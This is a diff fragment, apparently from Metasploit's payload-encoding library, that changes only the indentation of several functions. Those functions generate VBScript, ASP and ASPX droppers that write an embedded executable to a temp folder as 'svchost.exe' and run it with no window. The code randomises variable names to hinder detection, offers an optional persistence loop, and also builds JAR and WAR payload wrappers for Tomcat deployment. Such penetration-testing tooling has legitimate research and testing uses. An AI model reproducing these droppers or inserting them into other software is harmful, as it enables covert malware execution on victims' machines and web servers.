-		var_stream  = Rex::Text.rand_text_alpha(rand(8)+8)
-		var_obj     = Rex::Text.rand_text_alpha(rand(8)+8)
-		var_shell   = Rex::Text.rand_text_alpha(rand(8)+8)
-		var_tempdir = Rex::Text.rand_text_alpha(rand(8)+8)
-		var_tempexe = Rex::Text.rand_text_alpha(rand(8)+8)
-		var_basedir = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_bytes   = Rex::Text.rand_text_alpha(rand(4)+4) # repeated a large number of times, so keep this one small
+    var_fname   = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_func    = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_stream  = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_obj     = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_shell   = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_tempdir = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_tempexe = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_basedir = Rex::Text.rand_text_alpha(rand(8)+8)
 
-		vbs << "Function #{var_func}()\r\n"
+    vbs << "Function #{var_func}()\r\n"
 
-		vbs << "#{var_bytes}=Chr(#{exe[0]})"
+    vbs << "#{var_bytes}=Chr(#{exe[0]})"
 
-		lines = []
-		1.upto(exe.length-1) do |byte|
-			if(byte % 100 == 0)
-				lines.push "\r\n#{var_bytes}=#{var_bytes}"
-			end
-			# exe is an Array of bytes, not a String, thanks to the unpack
-			# above, so the following line is not subject to the different
-			# treatments of String#[] between ruby 1.8 and 1.9
-			lines.push "&Chr(#{exe[byte]})"
-		end
-		vbs << lines.join("") + "\r\n"
+    lines = []
+    1.upto(exe.length-1) do |byte|
+      if(byte % 100 == 0)
+        lines.push "\r\n#{var_bytes}=#{var_bytes}"
+      end
+      # exe is an Array of bytes, not a String, thanks to the unpack
+      # above, so the following line is not subject to the different
+      # treatments of String#[] between ruby 1.8 and 1.9
+      lines.push "&Chr(#{exe[byte]})"
+    end
+    vbs << lines.join("") + "\r\n"
 
-		vbs << "Dim #{var_obj}\r\n"
-		vbs << "Set #{var_obj} = CreateObject(\"Scripting.FileSystemObject\")\r\n"
-		vbs << "Dim #{var_stream}\r\n"
-		vbs << "Dim #{var_tempdir}\r\n"
-		vbs << "Dim #{var_tempexe}\r\n"
-		vbs << "Dim #{var_basedir}\r\n"
-		vbs << "Set #{var_tempdir} = #{var_obj}.GetSpecialFolder(2)\r\n"
+    vbs << "Dim #{var_obj}\r\n"
+    vbs << "Set #{var_obj} = CreateObject(\"Scripting.FileSystemObject\")\r\n"
+    vbs << "Dim #{var_stream}\r\n"
+    vbs << "Dim #{var_tempdir}\r\n"
+    vbs << "Dim #{var_tempexe}\r\n"
+    vbs << "Dim #{var_basedir}\r\n"
+    vbs << "Set #{var_tempdir} = #{var_obj}.GetSpecialFolder(2)\r\n"
 
-		vbs << "#{var_basedir} = #{var_tempdir} & \"\\\" & #{var_obj}.GetTempName()\r\n"
-		vbs << "#{var_obj}.CreateFolder(#{var_basedir})\r\n"
-		vbs << "#{var_tempexe} = #{var_basedir} & \"\\\" & \"svchost.exe\"\r\n"
-		vbs << "Set #{var_stream} = #{var_obj}.CreateTextFile(#{var_tempexe}, true , false)\r\n"
-		vbs << "#{var_stream}.Write #{var_bytes}\r\n"
-		vbs << "#{var_stream}.Close\r\n"
-		vbs << "Dim #{var_shell}\r\n"
-		vbs << "Set #{var_shell} = CreateObject(\"Wscript.Shell\")\r\n"
+    vbs << "#{var_basedir} = #{var_tempdir} & \"\\\" & #{var_obj}.GetTempName()\r\n"
+    vbs << "#{var_obj}.CreateFolder(#{var_basedir})\r\n"
+    vbs << "#{var_tempexe} = #{var_basedir} & \"\\\" & \"svchost.exe\"\r\n"
+    vbs << "Set #{var_stream} = #{var_obj}.CreateTextFile(#{var_tempexe}, true , false)\r\n"
+    vbs << "#{var_stream}.Write #{var_bytes}\r\n"
+    vbs << "#{var_stream}.Close\r\n"
+    vbs << "Dim #{var_shell}\r\n"
+    vbs << "Set #{var_shell} = CreateObject(\"Wscript.Shell\")\r\n"
 
-		vbs << "#{var_shell}.run #{var_tempexe}, 0, true\r\n"
-		vbs << "#{var_obj}.DeleteFile(#{var_tempexe})\r\n"
-		vbs << "#{var_obj}.DeleteFolder(#{var_basedir})\r\n"
-		vbs << "End Function\r\n"
+    vbs << "#{var_shell}.run #{var_tempexe}, 0, true\r\n"
+    vbs << "#{var_obj}.DeleteFile(#{var_tempexe})\r\n"
+    vbs << "#{var_obj}.DeleteFolder(#{var_basedir})\r\n"
+    vbs << "End Function\r\n"
 
-		vbs << "Do\r\n" if persist
-		vbs << "#{var_func}\r\n"
-		vbs << "WScript.Sleep #{delay * 1000}\r\n" if persist
-		vbs << "Loop\r\n" if persist
-		vbs
-	end
+    vbs << "Do\r\n" if persist
+    vbs << "#{var_func}\r\n"
+    vbs << "WScript.Sleep #{delay * 1000}\r\n" if persist
+    vbs << "Loop\r\n" if persist
+    vbs
+  end
 
-	def self.to_exe_asp(exes = '', opts={})
-		exe = exes.unpack('C*')
-		vbs = "<%\r\n"
+  def self.to_exe_asp(exes = '', opts={})
+    exe = exes.unpack('C*')
+    vbs = "<%\r\n"
 
-		var_bytes   = Rex::Text.rand_text_alpha(rand(4)+4) # repeated a large number of times, so keep this one small
-		var_fname   = Rex::Text.rand_text_alpha(rand(8)+8)
-		var_func    = Rex::Text.rand_text_alpha(rand(8)+8)
-		var_stream  = Rex::Text.rand_text_alpha(rand(8)+8)
-		var_obj     = Rex::Text.rand_text_alpha(rand(8)+8)
-		var_shell   = Rex::Text.rand_text_alpha(rand(8)+8)
-		var_tempdir = Rex::Text.rand_text_alpha(rand(8)+8)
-		var_tempexe = Rex::Text.rand_text_alpha(rand(8)+8)
-		var_basedir = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_bytes   = Rex::Text.rand_text_alpha(rand(4)+4) # repeated a large number of times, so keep this one small
+    var_fname   = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_func    = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_stream  = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_obj     = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_shell   = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_tempdir = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_tempexe = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_basedir = Rex::Text.rand_text_alpha(rand(8)+8)
 
-		vbs << "Sub #{var_func}()\r\n"
+    vbs << "Sub #{var_func}()\r\n"
 
-		vbs << "#{var_bytes}=Chr(#{exe[0]})"
+    vbs << "#{var_bytes}=Chr(#{exe[0]})"
 
-		lines = []
-		1.upto(exe.length-1) do |byte|
-			if(byte % 100 == 0)
-				lines.push "\r\n#{var_bytes}=#{var_bytes}"
-			end
-			# exe is an Array of bytes, not a String, thanks to the unpack
-			# above, so the following line is not subject to the different
-			# treatments of String#[] between ruby 1.8 and 1.9
-			lines.push "&Chr(#{exe[byte]})"
-		end
-		vbs << lines.join("") + "\r\n"
+    lines = []
+    1.upto(exe.length-1) do |byte|
+      if(byte % 100 == 0)
+        lines.push "\r\n#{var_bytes}=#{var_bytes}"
+      end
+      # exe is an Array of bytes, not a String, thanks to the unpack
+      # above, so the following line is not subject to the different
+      # treatments of String#[] between ruby 1.8 and 1.9
+      lines.push "&Chr(#{exe[byte]})"
+    end
+    vbs << lines.join("") + "\r\n"
 
-		vbs << "Dim #{var_obj}\r\n"
-		vbs << "Set #{var_obj} = CreateObject(\"Scripting.FileSystemObject\")\r\n"
-		vbs << "Dim #{var_stream}\r\n"
-		vbs << "Dim #{var_tempdir}\r\n"
-		vbs << "Dim #{var_tempexe}\r\n"
-		vbs << "Dim #{var_basedir}\r\n"
-		vbs << "Set #{var_tempdir} = #{var_obj}.GetSpecialFolder(2)\r\n"
+    vbs << "Dim #{var_obj}\r\n"
+    vbs << "Set #{var_obj} = CreateObject(\"Scripting.FileSystemObject\")\r\n"
+    vbs << "Dim #{var_stream}\r\n"
+    vbs << "Dim #{var_tempdir}\r\n"
+    vbs << "Dim #{var_tempexe}\r\n"
+    vbs << "Dim #{var_basedir}\r\n"
+    vbs << "Set #{var_tempdir} = #{var_obj}.GetSpecialFolder(2)\r\n"
 
-		vbs << "#{var_basedir} = #{var_tempdir} & \"\\\" & #{var_obj}.GetTempName()\r\n"
-		vbs << "#{var_obj}.CreateFolder(#{var_basedir})\r\n"
-		vbs << "#{var_tempexe} = #{var_basedir} & \"\\\" & \"svchost.exe\"\r\n"
-		vbs << "Set #{var_stream} = #{var_obj}.CreateTextFile(#{var_tempexe},2,0)\r\n"
-		vbs << "#{var_stream}.Write #{var_bytes}\r\n"
-		vbs << "#{var_stream}.Close\r\n"
-		vbs << "Dim #{var_shell}\r\n"
-		vbs << "Set #{var_shell} = CreateObject(\"Wscript.Shell\")\r\n"
+    vbs << "#{var_basedir} = #{var_tempdir} & \"\\\" & #{var_obj}.GetTempName()\r\n"
+    vbs << "#{var_obj}.CreateFolder(#{var_basedir})\r\n"
+    vbs << "#{var_tempexe} = #{var_basedir} & \"\\\" & \"svchost.exe\"\r\n"
+    vbs << "Set #{var_stream} = #{var_obj}.CreateTextFile(#{var_tempexe},2,0)\r\n"
+    vbs << "#{var_stream}.Write #{var_bytes}\r\n"
+    vbs << "#{var_stream}.Close\r\n"
+    vbs << "Dim #{var_shell}\r\n"
+    vbs << "Set #{var_shell} = CreateObject(\"Wscript.Shell\")\r\n"
 
-		vbs << "#{var_shell}.run #{var_tempexe}, 0, false\r\n"
-		vbs << "End Sub\r\n"
+    vbs << "#{var_shell}.run #{var_tempexe}, 0, false\r\n"
+    vbs << "End Sub\r\n"
 
-		vbs << "#{var_func}\r\n"
-		vbs << "%>\r\n"
-		vbs
-	end
+    vbs << "#{var_func}\r\n"
+    vbs << "%>\r\n"
+    vbs
+  end
 
-	def self.to_exe_aspx(exes = '', opts={})
-		exe = exes.unpack('C*')
+  def self.to_exe_aspx(exes = '', opts={})
+    exe = exes.unpack('C*')
 
-		var_file = Rex::Text.rand_text_alpha(rand(8)+8)
-		var_tempdir = Rex::Text.rand_text_alpha(rand(8)+8)
-		var_basedir = Rex::Text.rand_text_alpha(rand(8)+8)
-		var_filename = Rex::Text.rand_text_alpha(rand(8)+8)
-		var_tempexe = Rex::Text.rand_text_alpha(rand(8)+8)
-		var_iterator = Rex::Text.rand_text_alpha(rand(8)+8)
-		var_proc = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_file = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_tempdir = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_basedir = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_filename = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_tempexe = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_iterator = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_proc = Rex::Text.rand_text_alpha(rand(8)+8)
 
-		source = "<%@ Page Language=\"C#\" AutoEventWireup=\"true\" %>\r\n"
-		source << "<%@ Import Namespace=\"System.IO\" %>\r\n"
-		source << "<script runat=\"server\">\r\n"
-		source << "\tprotected void Page_Load(object sender, EventArgs e)\r\n"
-		source << "\t{\r\n"
-		source << "\t\tStringBuilder #{var_file} = new StringBuilder();\r\n"
-		source << "\t\t#{var_file}.Append(\"\\x#{exe[0].to_s(16)}"
+    source = "<%@ Page Language=\"C#\" AutoEventWireup=\"true\" %>\r\n"
+    source << "<%@ Import Namespace=\"System.IO\" %>\r\n"
+    source << "<script runat=\"server\">\r\n"
+    source << "\tprotected void Page_Load(object sender, EventArgs e)\r\n"
+    source << "\t{\r\n"
+    source << "\t\tStringBuilder #{var_file} = new StringBuilder();\r\n"
+    source << "\t\t#{var_file}.Append(\"\\x#{exe[0].to_s(16)}"
 
-		1.upto(exe.length-1) do |byte|
-				# Apparently .net 1.0 has a limit of 2046 chars per line
-				if(byte % 100 == 0)
-						source << "\");\r\n\t\t#{var_file}.Append(\""
-				end
-				source << "\\x#{exe[byte].to_s(16)}"
-		end
+    1.upto(exe.length-1) do |byte|
+        # Apparently .net 1.0 has a limit of 2046 chars per line
+        if(byte % 100 == 0)
+            source << "\");\r\n\t\t#{var_file}.Append(\""
+        end
+        source << "\\x#{exe[byte].to_s(16)}"
+    end
 
-		source << "\");\r\n"
-		source << "\t\tstring #{var_tempdir} = Path.GetTempPath();\r\n"
-		source << "\t\tstring #{var_basedir} = Path.Combine(#{var_tempdir}, \"#{var_filename}\");\r\n"
-		source << "\t\tstring #{var_tempexe} = Path.Combine(#{var_basedir}, \"svchost.exe\");\r\n"
-		source << "\r\n"
-		source << "\t\tDirectory.CreateDirectory(#{var_basedir});\r\n"
-		source << "\r\n"
-		source << "\t\tFileStream fs = File.Create(#{var_tempexe});\r\n"
-		source << "\t\ttry\r\n"
-		source << "\t\t{\r\n"
-		source << "\t\t\tforeach (char #{var_iterator} in #{var_file}.ToString())\r\n"
-		source << "\t\t\t{\r\n"
-		source << "\t\t\t\tfs.WriteByte(Convert.ToByte(#{var_iterator}));\r\n"
-		source << "\t\t\t}\r\n"
-		source << "\t\t}\r\n"
-		source << "\t\tfinally\r\n"
-		source << "\t\t{\r\n"
-		source << "\t\t\tif (fs != null) ((IDisposable)fs).Dispose();\r\n"
-		source << "\t\t}\r\n"
-		source << "\r\n"
-		source << "\t\tSystem.Diagnostics.Process #{var_proc} = new System.Diagnostics.Process();\r\n"
-		source << "\t\t#{var_proc}.StartInfo.CreateNoWindow = true;\r\n"
-		source << "\t\t#{var_proc}.StartInfo.UseShellExecute = true;\r\n"
-		source << "\t\t#{var_proc}.StartInfo.FileName = #{var_tempexe};\r\n"
-		source << "\t\t#{var_proc}.Start();\r\n"
-		source << "\r\n"
-		source << "\t}\r\n"
-		source << "</script>\r\n"
-		source
-	end
+    source << "\");\r\n"
+    source << "\t\tstring #{var_tempdir} = Path.GetTempPath();\r\n"
+    source << "\t\tstring #{var_basedir} = Path.Combine(#{var_tempdir}, \"#{var_filename}\");\r\n"
+    source << "\t\tstring #{var_tempexe} = Path.Combine(#{var_basedir}, \"svchost.exe\");\r\n"
+    source << "\r\n"
+    source << "\t\tDirectory.CreateDirectory(#{var_basedir});\r\n"
+    source << "\r\n"
+    source << "\t\tFileStream fs = File.Create(#{var_tempexe});\r\n"
+    source << "\t\ttry\r\n"
+    source << "\t\t{\r\n"
+    source << "\t\t\tforeach (char #{var_iterator} in #{var_file}.ToString())\r\n"
+    source << "\t\t\t{\r\n"
+    source << "\t\t\t\tfs.WriteByte(Convert.ToByte(#{var_iterator}));\r\n"
+    source << "\t\t\t}\r\n"
+    source << "\t\t}\r\n"
+    source << "\t\tfinally\r\n"
+    source << "\t\t{\r\n"
+    source << "\t\t\tif (fs != null) ((IDisposable)fs).Dispose();\r\n"
+    source << "\t\t}\r\n"
+    source << "\r\n"
+    source << "\t\tSystem.Diagnostics.Process #{var_proc} = new System.Diagnostics.Process();\r\n"
+    source << "\t\t#{var_proc}.StartInfo.CreateNoWindow = true;\r\n"
+    source << "\t\t#{var_proc}.StartInfo.UseShellExecute = true;\r\n"
+    source << "\t\t#{var_proc}.StartInfo.FileName = #{var_tempexe};\r\n"
+    source << "\t\t#{var_proc}.Start();\r\n"
+    source << "\r\n"
+    source << "\t}\r\n"
+    source << "</script>\r\n"
+    source
+  end
 
         def self.to_win32pe_psh_net(framework, code, opts={})
                 var_code = Rex::Text.rand_text_alpha(rand(3)+2)
@@ -1282,73 +1282,73 @@ End Sub
 
         end
 
-	def self.to_win32pe_vbs(framework, code, opts={})
-		to_exe_vbs(to_win32pe(framework, code, opts), opts)
-	end
+  def self.to_win32pe_vbs(framework, code, opts={})
+    to_exe_vbs(to_win32pe(framework, code, opts), opts)
+  end
 
-	def self.to_win32pe_asp(framework, code, opts={})
-		to_exe_asp(to_win32pe(framework, code, opts), opts)
-	end
+  def self.to_win32pe_asp(framework, code, opts={})
+    to_exe_asp(to_win32pe(framework, code, opts), opts)
+  end
 
-	def self.to_win32pe_aspx(framework, code, opts={})
-		to_exe_aspx(to_win32pe(framework, code, opts), opts)
-	end
+  def self.to_win32pe_aspx(framework, code, opts={})
+    to_exe_aspx(to_win32pe(framework, code, opts), opts)
+  end
 
-	# Creates a jar file that drops the provided +exe+ into a random file name
-	# in the system's temp dir and executes it.
-	#
-	# @see Msf::Payload::Java
-	#
-	# @return [Rex::Zip::Jar]
-	def self.to_jar(exe, opts={})
-		spawn = opts[:spawn] || 2
-		exe_name = Rex::Text.rand_text_alpha(8) + ".exe"
-		zip = Rex::Zip::Jar.new
-		paths = [
-			[ "metasploit", "Payload.class" ],
-		]
-		zip.add_files(paths, File.join(Msf::Config.data_directory, "java"))
-		zip.build_manifest :main_class => "metasploit.Payload"
-		config = "Spawn=#{spawn}\r\nExecutable=#{exe_name}\r\n"
-		zip.add_file("metasploit.dat", config)
-		zip.add_file(exe_name, exe)
+  # Creates a jar file that drops the provided +exe+ into a random file name
+  # in the system's temp dir and executes it.
+  #
+  # @see Msf::Payload::Java
+  #
+  # @return [Rex::Zip::Jar]
+  def self.to_jar(exe, opts={})
+    spawn = opts[:spawn] || 2
+    exe_name = Rex::Text.rand_text_alpha(8) + ".exe"
+    zip = Rex::Zip::Jar.new
+    paths = [
+      [ "metasploit", "Payload.class" ],
+    ]
+    zip.add_files(paths, File.join(Msf::Config.data_directory, "java"))
+    zip.build_manifest :main_class => "metasploit.Payload"
+    config = "Spawn=#{spawn}\r\nExecutable=#{exe_name}\r\n"
+    zip.add_file("metasploit.dat", config)
+    zip.add_file(exe_name, exe)
 
-		zip
-	end
+    zip
+  end
 
-	# Creates a Web Archive (WAR) file from the provided jsp code.
-	#
-	# On Tomcat, WAR files will be deployed into a directory with the same name
-	# as the archive, e.g. +foo.war+ will be extracted into +foo/+. If the
-	# server is in a default configuration, deoployment will happen
-	# automatically. See
-	# {http://tomcat.apache.org/tomcat-5.5-doc/config/host.html the Tomcat
-	# documentation} for a description of how this works.
-	#
-	# @param jsp_raw [String] JSP code to be added in a file called +jsp_name+
-	#   in the archive. This will be compiled by the victim servlet container
-	#   (e.g., Tomcat) and act as the main function for the servlet.
-	# @param opts [Hash]
-	# @option opts :jsp_name [String] Name of the <jsp-file> in the archive
-	#   _without the .jsp extension_. Defaults to random.
-	# @option opts :app_name [String] Name of the app to put in the <servlet-name>
-	#   tag. Mostly irrelevant, except as an identifier in web.xml. Defaults to
-	#   random.
-	# @option opts :extra_files [Array<String,String>] Additional files to add
-	#   to the archive. First elment is filename, second is data
-	#
-	# @todo Refactor to return a {Rex::Zip::Archive} or {Rex::Zip::Jar}
-	#
-	# @return [String]
-	def self.to_war(jsp_raw, opts={})
-		jsp_name = opts[:jsp_name]
-		jsp_name ||= Rex::Text.rand_text_alpha_lower(rand(8)+8)
-		app_name = opts[:app_name]
-		app_name ||= Rex::Text.rand_text_alpha_lower(rand(8)+8)
+  # Creates a Web Archive (WAR) file from the provided jsp code.
+  #
+  # On Tomcat, WAR files will be deployed into a directory with the same name
+  # as the archive, e.g. +foo.war+ will be extracted into +foo/+. If the
+  # server is in a default configuration, deoployment will happen
+  # automatically. See
+  # {http://tomcat.apache.org/tomcat-5.5-doc/config/host.html the Tomcat
+  # documentation} for a description of how this works.
+  #
+  # @param jsp_raw [String] JSP code to be added in a file called +jsp_name+
+  #   in the archive. This will be compiled by the victim servlet container
+  #   (e.g., Tomcat) and act as the main function for the servlet.
+  # @param opts [Hash]
+  # @option opts :jsp_name [String] Name of the <jsp-file> in the archive
+  #   _without the .jsp extension_. Defaults to random.
+  # @option opts :app_name [String] Name of the app to put in the <servlet-name>
+  #   tag. Mostly irrelevant, except as an identifier in web.xml. Defaults to
+  #   random.
+  # @option opts :extra_files [Array<String,String>] Additional files to add
+  #   to the archive. First elment is filename, second is data
+  #
+  # @todo Refactor to return a {Rex::Zip::Archive} or {Rex::Zip::Jar}
+  #
+  # @return [String]
+  def self.to_war(jsp_raw, opts={})
+    jsp_name = opts[:jsp_name]
+    jsp_name ||= Rex::Text.rand_text_alpha_lower(rand(8)+8)
+    app_name = opts[:app_name]
+    app_name ||= Rex::Text.rand_text_alpha_lower(rand(8)+8)
 
-		meta_inf = [ 0xcafe, 0x0003 ].pack('Vv')
-		manifest = "Manifest-Version: 1.0\r\nCreated-By: 1.6.0_17 (Sun Microsystems Inc.)\r\n\r\n"
-		web_xml = %q{<?xml version="1.0"?>
+    meta_inf = [ 0xcafe, 0x0003 ].pack('Vv')
+    manifest = "Manifest-Version: 1.0\r\nCreated-By: 1.6.0_17 (Sun Microsystems Inc.)\r\n\r\n"
+    web_xml = %q{<?xml version="1.0"?>
 <!DOCTYPE web-app PUBLIC
 "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
 "http://java.sun.com/dtd/web-app_2_3.dtd">
